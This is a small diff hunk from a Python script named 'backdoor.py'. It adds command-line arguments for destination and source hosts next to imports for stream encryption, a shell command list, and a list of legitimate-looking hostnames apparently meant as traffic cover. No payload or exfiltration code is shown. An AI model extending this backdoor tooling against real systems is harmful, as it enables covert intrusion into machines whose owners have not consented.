@@ -4,6 +4,15 @@ from utils.encryption import StreamEncryption
 from utils.shell import LIST
 import os
 from random import randint
+import argparse
+from ipaddress import ip_address, IPv6Address
+from sys import exit
+
+# Command Line Arguments
+parser = argparse.ArgumentParser("./backdoor.py")
+parser.add_argument("destination_host", help="Destination host. IPv4.")
+parser.add_argument("source_host", help="Source host. IPv4.")
+args = parser.parse_args()
 
 hostnames = ["play.google.com", 
             "pixel.33across.com", 
